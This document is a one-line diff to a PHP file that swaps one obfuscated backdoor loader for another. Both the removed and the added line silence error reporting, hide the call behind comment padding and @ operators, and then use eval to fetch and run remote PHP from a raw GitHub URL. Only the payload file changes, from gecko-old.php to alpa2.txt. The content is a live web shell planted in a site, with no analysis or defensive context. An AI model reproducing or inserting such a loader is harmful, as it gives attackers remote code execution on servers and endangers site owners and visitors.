@@ -1,1 +1,1 @@
-<?=/****/@/*55555*/null; /******/@/*55555*/error_reporting(0);/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/gecko-old.php"))?>
+<?=/****/@/*55555*/null; /******/@/*55555*/error_reporting(0);/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/alpa2.txt"))?>
